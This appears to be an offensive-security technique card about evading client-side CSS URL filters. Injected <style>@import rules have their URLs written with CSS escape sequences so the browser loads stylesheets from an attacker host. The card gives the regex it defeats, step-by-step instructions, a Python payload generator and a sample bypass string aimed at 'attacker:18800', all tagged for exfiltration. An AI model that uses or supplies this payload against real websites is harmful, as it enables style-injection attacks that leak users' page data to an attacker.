---
name: css_import_escape_url_filter_bypass
vuln_type: xss
sub_technique: css_filter_bypass
category: exploitation
safety_level: safe
tags:
- css
- import
- escape
- filter-bypass
- style-injection
- exfiltration
---

# Css @Import Remote Url Filter Bypass Via Css Escape Sequences

## When to Apply

Client-side JS detects and blocks remote URLs (http://, //) inside <style> blocks, but CSS escape sequences (\3a = ':', \2f = '/') bypass the JS regex while the browser correctly parses and loads the external resource URL.

## Prerequisites

- <style> tag injection possible (e.g. in posts)
- Client-side JS filters remote URLs in CSS via regex
- Server-side allows <style> tags (not removed by DOMPurify or handled separately)

## Steps

1. Analyze JS filter: `/\b(?:https?|data)\s*:/i.test(css)` or `css.includes('//')`
2. Bypass via CSS escape: `http\3a \2f \2f attacker\2f style.css`
3. Load external CSS with `@import` rule: `<style>@import 'http\3a \2f \2f ...';</style>`
4. Browser decodes escapes and requests the URL normally

## Code Template

```
def css_escape_url(url):
    return (url.replace(':', '\\3a ')
               .replace('/', '\\2f ')
               .replace('?', '\\3f ')
               .replace('=', '\\3d ')
               .replace('&', '\\26 '))

payload = f"<style>@import '{css_escape_url(collector_url)}';</style>"
```

## Examples

### Example 1

- **filter_regex**: /\b(?:https?|data)\s*:/i.test(css) || css.includes('//')
- **bypass**: http\3a \2f \2f attacker:18800\2f style.css
- **max_payload_len**: 320
